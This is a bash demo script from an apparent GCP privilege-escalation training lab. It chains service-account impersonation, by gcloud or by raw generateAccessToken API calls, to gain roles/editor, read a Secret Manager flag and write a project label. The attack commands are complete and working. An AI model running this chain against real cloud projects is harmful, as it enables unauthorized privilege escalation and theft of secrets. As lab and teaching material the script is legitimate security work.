#!/bin/bash

# Demo script for gcp-iam-001-iam-serviceaccountsgetaccesstoken privilege escalation
#
# Attack: starting_sa holds iam.serviceAccounts.getAccessToken on target_sa
# (via a minimal custom role). It calls generateAccessToken to mint a
# short-lived OAuth token for target_sa and inherit its roles/editor project
# permissions.
#
# Credential model (no static SA keys):
#   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
#   Demo commands pass --impersonate-service-account=starting_sa to run as it.
#   The exploit then chains impersonation to target_sa, which holds roles/editor.
#
# Modes:
#   Default (gcloud): uses gcloud's --impersonate-service-account delegation
#     chain (starting_sa,target_sa) — concise, but hides the two API calls
#     that gcloud makes internally.
#
#   --api-only: calls the IAM Credentials REST API (generateAccessToken)
#     explicitly for each hop. Requires identical permissions to gcloud mode —
#     no extra gcloud-mechanic overhead here — but makes the attack surface
#     visible: two generateAccessToken calls, one per hop in the chain.

# Parse --api-only flag
USE_GCLOUD=true
for arg in "$@"; do
    case "$arg" in
        --api-only) USE_GCLOUD=false ;;
    esac
done

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
DIM='\033[2m'

ATTACK_COMMANDS=()

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Like show_attack_cmd but does not add to the summary — use for illustrative
# commands that show individual hops but are not the actual exploit commands.
show_illustrative_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}GCP-IAM-001: Service Account Access Token Generation Privilege Escalation Demo${NC}"
if $USE_GCLOUD; then
    echo -e "${GREEN}Mode: gcloud (default)${NC}"
    echo "  Uses gcloud's --impersonate-service-account delegation chain."
    echo "  Run with --api-only to see the two generateAccessToken calls made explicit."
else
    echo -e "${GREEN}Mode: raw API (--api-only)${NC}"
    echo "  Calls generateAccessToken directly for each hop — same permissions, chain made visible."
fi
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve scenario configuration from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../../../gcp  # scenario dir -> gcp/ (terraform root)

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | \
    jq -r '.gcp_single_account_privesc_one_hop_to_admin_gcp_iam_001_iam_serviceaccountsgetaccesstoken.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you have deployed this scenario: plabs apply"
    exit 1
fi

STARTING_SA_EMAIL=$(echo "$MODULE_OUTPUT" | jq -r '.starting_sa_email')
TARGET_SA_EMAIL=$(echo "$MODULE_OUTPUT"   | jq -r '.target_sa_email')
FLAG_SECRET_ID=$(echo "$MODULE_OUTPUT"    | jq -r '.flag_secret_id')
DEPLOYER_EMAIL=$(echo "$MODULE_OUTPUT"    | jq -r '.deployer_email')
PROJECT_ID=$(terraform output -raw gcp_project_id 2>/dev/null)

cd - > /dev/null

for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID; do
    val="${!var_name}"
    if [ -z "$val" ] || [ "$val" = "null" ]; then
        echo -e "${RED}Error: Could not extract $var_name from Terraform output${NC}"
        exit 1
    fi
done

echo "Starting SA (no project role): $STARTING_SA_EMAIL"
echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
echo "Project:                       $PROJECT_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Hard-fail if our current gcloud CLI identity differs from the deployer that
# terraform provisioned. Terraform's ADC-derived deployer identity and the
# gcloud CLI session are two separate credential stores; a mismatch means
# every --impersonate-service-account call below will fail with a permission
# error, so stop now with actionable remediation instead of failing deep into
# the demo.
CURRENT_ADC_EMAIL=$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -1)
if [ -n "$CURRENT_ADC_EMAIL" ] && [ "$CURRENT_ADC_EMAIL" != "$DEPLOYER_EMAIL" ]; then
    echo -e "${RED}Error: Your active gcloud account ($CURRENT_ADC_EMAIL) differs from the${NC}"
    echo -e "${RED}deployer account that provisioned the impersonation grant ($DEPLOYER_EMAIL).${NC}"
    echo -e "${RED}Run: gcloud auth login --update-adc${NC}"
    echo -e "${RED}This sets both your gcloud CLI session and ADC to the same identity.${NC}"
    echo -e "${RED}Then re-run 'terraform apply' if the deployer identity changed.${NC}\n"
    exit 1
fi

echo -e "${YELLOW}Waiting for IAM bindings to propagate (15s)...${NC}"
sleep 15
echo -e "${GREEN}✓ Propagation wait complete${NC}\n"

# Step 2: Verify starting SA has no project role of its own
# We impersonate starting_sa and try to read the flag — it should be denied.
echo -e "${YELLOW}Step 2: Confirming starting SA has no project-level privilege${NC}"
show_cmd "$STARTING_SA_EMAIL" \
    "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL (expected: PERMISSION_DENIED)"

if gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null; then
    echo -e "${YELLOW}Note: starting SA can already read the secret — check IAM bindings${NC}"
else
    echo -e "${GREEN}✓ Confirmed: starting SA cannot read the flag (no project role, as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 3: Chain impersonation starting_sa → target_sa → flag
echo -e "${YELLOW}Step 3: [EXPLOIT] Chaining impersonation starting_sa → target_sa → flag${NC}"

if $USE_GCLOUD; then
    # gcloud's --impersonate-service-account accepts a comma-separated delegation
    # chain. Each principal must hold iam.serviceAccounts.getAccessToken on the next:
    #   your ADC → (roles/iam.serviceAccountTokenCreator) → starting_sa
    #            → (minimal custom role: getAccessToken) → target_sa  [THE VULNERABILITY]
    # gcloud resolves the full chain internally and executes the command as the
    # last SA in the list. The intermediate tokens are never exposed.
    #
    # Steps 3a and 3b below mint tokens for each hop individually to make the
    # chain visible — they are NOT needed for the attack. Step 3c is the actual
    # exploit: the full delegation chain in a single gcloud command.

    # Step 3a: [ILLUSTRATIVE] Mint a token as starting_sa to show hop 1 is possible.
    # The token is printed and discarded — subsequent commands re-derive it
    # internally. This step is here to make the first link in the chain visible.
    echo -e "\n${DIM}Step 3a (illustrative — shows hop 1 works, not needed for the attack):${NC}"
    show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
        "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL"
    STARTING_SA_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
    if [ -z "$STARTING_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to mint token for starting SA${NC}"
        echo "Check that $DEPLOYER_EMAIL holds serviceAccountTokenCreator on $STARTING_SA_EMAIL"
        exit 1
    fi
    echo -e "${GREEN}✓ Minted short-lived token for $STARTING_SA_EMAIL (hop 1 confirmed)${NC}"

    # Step 3b: [ILLUSTRATIVE] Mint a token via the full chain to show hop 2 is possible.
    # Again, this token is discarded. Step 3c re-derives it as part of the real command.
    echo -e "\n${DIM}Step 3b (illustrative — shows hop 2 works, not needed for the attack):${NC}"
    show_illustrative_cmd "$STARTING_SA_EMAIL" \
        "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
    TARGET_SA_TOKEN=$(gcloud auth print-access-token \
        --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" 2>/dev/null)
    if [ -z "$TARGET_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to chain impersonation to target SA${NC}"
        echo "Check that $STARTING_SA_EMAIL holds iam.serviceAccounts.getAccessToken on $TARGET_SA_EMAIL"
        exit 1
    fi
    echo -e "${GREEN}✓ Chained impersonation to $TARGET_SA_EMAIL (hop 2 confirmed)${NC}"

    # Step 3c: [THE ATTACK] Read the flag as target_sa using the full delegation chain.
    # gcloud resolves starting_sa → target_sa internally — no separate token step
    # needed. This single command is the complete exploit.
    echo -e "\n${DIM}Step 3c (the actual attack — full chain in one command):${NC}"
    show_attack_cmd "$TARGET_SA_EMAIL" \
        "gcloud secrets versions access latest --secret=$FLAG_SECRET_ID --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"

    FLAG_VALUE=$(gcloud secrets versions access latest \
        --secret="$FLAG_SECRET_ID" \
        --project="$PROJECT_ID" \
        --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" 2>/dev/null)

    if [ -z "$FLAG_VALUE" ]; then
        echo -e "${RED}✗ Failed to read flag via impersonation chain${NC}"
        echo "Check that starting_sa holds iam.serviceAccounts.getAccessToken on $TARGET_SA_EMAIL"
        exit 1
    fi
    echo -e "${GREEN}✓ Read Secret Manager secret as $TARGET_SA_EMAIL via chained impersonation${NC}\n"

else
    # --api-only: call the IAM Credentials REST API (generateAccessToken) directly
    # for each hop. Same permissions as gcloud mode — this makes the two API calls
    # that gcloud hides behind --impersonate-service-account=a,b explicit.

    # Step 3a (raw): Get ADC token to bootstrap the chain
    echo -e "\n${DIM}Step 3a (raw API — get your ADC's access token for the first hop):${NC}"
    show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
        "ADC_TOKEN=\$(gcloud auth print-access-token)"
    ADC_TOKEN=$(gcloud auth print-access-token 2>/dev/null)
    if [ -z "$ADC_TOKEN" ]; then
        echo -e "${RED}✗ Failed to get ADC token${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Got ADC access token for $DEPLOYER_EMAIL${NC}"

    # Step 3b (raw): Hop 1 — generateAccessToken for starting_sa
    echo -e "\n${DIM}Step 3b (raw API — hop 1: generateAccessToken for starting_sa):${NC}"
    show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
        "curl -X POST -H 'Authorization: Bearer \$ADC_TOKEN' -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}' 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${STARTING_SA_EMAIL}:generateAccessToken'"

    STARTING_SA_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $ADC_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${STARTING_SA_EMAIL}:generateAccessToken")
    STARTING_SA_TOKEN=$(echo "$STARTING_SA_RESPONSE" | jq -r '.accessToken // empty')
    if [ -z "$STARTING_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to get starting_sa token${NC}"
        echo "$STARTING_SA_RESPONSE"
        exit 1
    fi
    echo -e "${GREEN}✓ Minted short-lived token for $STARTING_SA_EMAIL (hop 1 confirmed)${NC}"

    # Step 3c (raw): Hop 2 — generateAccessToken for target_sa [THE EXPLOIT]
    echo -e "\n${DIM}Step 3c (raw API — hop 2: generateAccessToken for target_sa — THE EXPLOIT):${NC}"
    show_attack_cmd "$STARTING_SA_EMAIL" \
        "curl -X POST -H 'Authorization: Bearer \$STARTING_SA_TOKEN' -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}' 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${TARGET_SA_EMAIL}:generateAccessToken'"

    TARGET_SA_RESPONSE=$(curl -s -X POST \
        -H "Authorization: Bearer $STARTING_SA_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${TARGET_SA_EMAIL}:generateAccessToken")
    TARGET_SA_TOKEN=$(echo "$TARGET_SA_RESPONSE" | jq -r '.accessToken // empty')
    if [ -z "$TARGET_SA_TOKEN" ]; then
        echo -e "${RED}✗ Failed to chain to target_sa${NC}"
        echo "Check that $STARTING_SA_EMAIL holds iam.serviceAccounts.getAccessToken on $TARGET_SA_EMAIL"
        echo "$TARGET_SA_RESPONSE"
        exit 1
    fi
    echo -e "${GREEN}✓ Chained impersonation to $TARGET_SA_EMAIL via generateAccessToken (hop 2 confirmed)${NC}"

    # Step 3d (raw): Read flag with target_sa token
    echo -e "\n${DIM}Step 3d (raw API — read flag as target_sa):${NC}"
    show_attack_cmd "$TARGET_SA_EMAIL (via generateAccessToken)" \
        "curl -s -H 'Authorization: Bearer \$TARGET_SA_TOKEN' 'https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access'"

    SECRET_RESPONSE=$(curl -s \
        -H "Authorization: Bearer $TARGET_SA_TOKEN" \
        "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access")
    ENCODED_FLAG=$(echo "$SECRET_RESPONSE" | jq -r '.payload.data // empty')
    if [ -z "$ENCODED_FLAG" ]; then
        echo -e "${RED}✗ Failed to read flag${NC}"
        echo "$SECRET_RESPONSE"
        exit 1
    fi
    FLAG_VALUE=$(echo "$ENCODED_FLAG" | openssl base64 -d -A)
    if [ -z "$FLAG_VALUE" ]; then
        echo -e "${RED}✗ Failed to decode flag${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Read Secret Manager secret as $TARGET_SA_EMAIL via raw generateAccessToken chain${NC}\n"
fi

# Step 4: [THE ATTACK] Confirm editor-level write access (beyond just reading a secret).
echo -e "${YELLOW}Step 4: [EXPLOIT] Verifying full roles/editor access via target SA (write proof)${NC}"

if $USE_GCLOUD; then
    # Same full delegation chain — target_sa holds roles/editor on the project.
    show_attack_cmd "$TARGET_SA_EMAIL" \
        "gcloud projects update $PROJECT_ID --update-labels=pl-privesc-verified=true --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"

    if gcloud projects update "$PROJECT_ID" \
            --update-labels=pl-privesc-verified=true \
            --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
            --quiet 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully wrote a project label as $TARGET_SA_EMAIL!${NC}"
        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
        gcloud projects update "$PROJECT_ID" \
            --remove-labels=pl-privesc-verified \
            --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
            --quiet 2>/dev/null || true
    else
        echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
    fi
else
    # Use TARGET_SA_TOKEN from step 3c directly — no gcloud needed.
    show_attack_cmd "$TARGET_SA_EMAIL (via generateAccessToken)" \
        "curl -X PATCH -H 'Authorization: Bearer \$TARGET_SA_TOKEN' -d '{\"labels\": {...}}' 'https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels'"

    CURRENT_PROJECT_JSON=$(curl -s \
        -H "Authorization: Bearer $TARGET_SA_TOKEN" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
    CURRENT_LABELS=$(echo "$CURRENT_PROJECT_JSON" | jq -c '.labels // {}')
    UPDATED_LABELS=$(echo "$CURRENT_LABELS" | jq -c '. + {"pl-privesc-verified": "true"}')

    PATCH_RESPONSE=$(curl -s -X PATCH \
        -H "Authorization: Bearer $TARGET_SA_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"labels\": $UPDATED_LABELS}" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels")

    if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
        echo -e "${GREEN}✓ Successfully wrote a project label using the generateAccessToken-derived token!${NC}"
        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
        curl -s -X PATCH \
            -H "Authorization: Bearer $TARGET_SA_TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"labels\": $CURRENT_LABELS}" \
            "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels" > /dev/null 2>&1 || true
    else
        echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
    fi
fi
echo ""

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. ADC identity ($DEPLOYER_EMAIL) acted as $STARTING_SA_EMAIL, which acted as"
echo "   $TARGET_SA_EMAIL (roles/editor + secretAccessor) to read the CTF flag"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_SA_EMAIL"
echo "    -> (iam.serviceAccounts.getAccessToken on target_sa, via minimal custom role — THE VULNERABILITY)"
echo "    -> $TARGET_SA_EMAIL"
echo "    -> (roles/editor on project $PROJECT_ID)"
echo "    -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Key Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Note on gcloud vs. raw API:${NC}"
if $USE_GCLOUD; then
    echo "  This demo used gcloud's --impersonate-service-account delegation chain, which"
    echo "  handles the two generateAccessToken API calls internally. Both modes require"
    echo "  identical permissions — there are no extra gcloud-mechanic permissions here."
    echo "  To see the generateAccessToken calls made explicit for each hop, run:"
    echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
else
    echo "  This demo called the IAM Credentials REST API (generateAccessToken) directly for"
    echo "  each hop in the chain. The gcloud equivalent uses --impersonate-service-account=a,b"
    echo "  delegation syntax which does the same calls internally."
    echo "  Both modes require identical permissions — no extra gcloud-mechanic overhead."
    echo "  To use the gcloud version, run without any flags:"
    echo -e "  ${CYAN}\$ ./demo_attack.sh${NC}"
fi

echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
echo ""

touch "$(dirname "$0")/.demo_active"
